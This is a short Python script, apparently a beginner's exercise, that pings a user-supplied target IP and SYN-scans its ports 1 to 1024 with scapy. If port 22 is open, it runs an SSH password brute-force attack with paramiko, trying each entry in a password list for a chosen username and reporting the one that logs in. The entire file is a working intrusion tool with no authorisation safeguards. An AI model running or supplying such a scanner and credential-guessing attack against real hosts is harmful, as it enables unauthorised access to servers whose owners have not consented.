# Importing all the sub liberies from scapy.all
from socket import timeout
from sys import flags
from scapy.all import *
from scapy.layers.inet import TCP, IP, Ether, ICMP
from scapy.layers.l2 import ARP
import paramiko

# Asking the user for target ip address
target = input("Please insert your target IP: ==> ")

# Creating variable that equals to all registered ports
Registered_Ports = range(1,1025)

# Creating an empty list by name Open_Ports
Open_Ports = []

# Creating scan port function with single argument followed by the name port
def ScanPort(port):
    src_port = RandShort()
    conf.verb = 0
    Syn_Pkt = sr1(IP(dst=target)/TCP(sport=src_port,dport=port,flags="S"), timeout=0.5)
    if Syn_Pkt:
        if Syn_Pkt.haslayer(TCP):
            if Syn_Pkt[1].flags == 0x12:
                sr(IP(dst=target)/TCP(sport=src_port,dport=port,flags="R"), timeout=2)
                return True
        else:
            return False
    else:
        return False
# Creating availability check fuction on the target address
def target_availability():
    try:
        conf.verb = 0
        Send_Ping = sr1(IP(dst=target)/ICMP(),timeout=3)
    except Exception as e:
        print(e)
        return False

    if Send_Ping:
            return True
target_availa = target_availability()
def main():
    if target_availa == True:
        for port in Registered_Ports:
            status = ScanPort(port)
            if status == True:
                Open_Ports.append(port)
        print(f"The scan is complete, the open ports on the target scanned are:\n{Open_Ports}")
        if 22 in Open_Ports:
            port = 22
            brt_frc = input("The scan discovered that port 22 is open would you like to preform brute force on that port? yes/no ==> ")
            if brt_frc == "yes" or brt_frc == "Yes" or brt_frc == "y" or brt_frc == "Y":
                BruteForce(port)
            else:
                print("BYE!")
                exit()
def BruteForce(port):
    with open("PasswordList.txt","r") as myfile:
        passwords = myfile.read()
        passwords = passwords.split()
        user = input("Please insert the user name you want to preform brute force with : ==> ")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
            print(f"Success, the {password} logged you in the server!")
            SSHconn.close()
            break
        except Exception:
            print(f"The password {password} failed!")
main()